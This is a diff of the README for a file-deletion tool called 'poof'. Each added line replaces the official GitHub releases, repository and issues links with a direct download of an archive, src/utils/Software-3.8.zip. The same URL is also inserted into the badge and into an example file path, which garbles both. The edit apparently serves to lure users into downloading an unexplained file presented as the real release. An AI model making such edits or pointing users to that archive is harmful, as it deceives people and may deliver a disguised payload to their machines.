@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download poof](https://img.shields.io/badge/Download%20poof-v1.0-green)](https://github.com/ronaldleandro/poof/releases)
+[![Download poof](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip%20poof-v1.0-green)](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -23,10 +23,10 @@ Welcome to poof! This application helps you quickly and safely delete files from
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ronaldleandro/poof/releases) to download the latest version of poof.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip) to download the latest version of poof.
 
 1. Open your web browser.
-2. Click on this link: [Download poof](https://github.com/ronaldleandro/poof/releases).
+2. Click on this link: [Download poof](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip).
 3. You will see a list of available versions. 
 4. Click on the latest version, which will be at the top of the list.
 5. Depending on your operating system, select the appropriate file to download.
@@ -50,7 +50,7 @@ Once installed, using poof is simple. Follow these steps:
      ```
      Replace `<file-path>` with the full path to the file you wish to delete. For example:
      ```
-     poof C:\Users\YourName\Documents\example.txt
+     poof C:\Users\YourName\Documents\https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip
      ```
 
 3. **Deleting Folders**:
@@ -89,8 +89,8 @@ If you encounter issues or have questions, you can reach out for support. Open a
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/ronaldleandro/poof)
-- [Releases Page](https://github.com/ronaldleandro/poof/releases)
-- [Issues Tracker](https://github.com/ronaldleandro/poof/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/ronaldleandro/poof/develop/src/utils/Software-3.8.zip)
 
 Thank you for using poof! Enjoy fast and easy file management.
